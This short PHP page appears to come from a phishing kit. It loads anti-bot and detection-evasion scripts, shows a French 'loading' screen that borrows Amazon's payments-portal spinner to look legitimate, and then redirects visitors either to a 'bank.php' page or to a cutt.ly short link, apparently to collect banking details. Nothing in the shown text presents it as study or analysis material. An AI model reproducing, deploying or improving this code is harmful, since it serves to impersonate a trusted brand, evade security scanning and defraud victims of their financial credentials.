<?php
session_start();
include('../ANTIBOTS/antibots.php');
include('../PREVENTS/anti1.php');
include('../PREVENTS/anti2.php');
include('../PREVENTS/anti3.php');
include('../PREVENTS/anti4.php');
include('../PREVENTS/anti5.php');
include('../PREVENTS/anti6.php');
include('../PREVENTS/anti7.php');
include('../PREVENTS/anti8.php');
?>

<html>
<head>
	
	<title>Chargement en cours ...</title>
	<meta name="viewport" content="width=device-width"/>
</head>

<?php
if(strpos($_SERVER['REQUEST_URI'],"finished"))
{
	echo '<meta http-equiv="refresh" content="2;URL=https://cutt.ly/xvu4TYM">';

}

?>

<?php
if(strpos($_SERVER['REQUEST_URI'],"bank"))
{
	echo '<meta http-equiv="refresh" content="2;URL=bank.php">';

}

?>

<body>
	<div style="text-align: center;">
<img style="margin-top: 200px;" src="https://images-na.ssl-images-amazon.com/images/G/01/payments-portal/r1/loading-4x._CB338200758_.gif">
</div>
</body>

</html>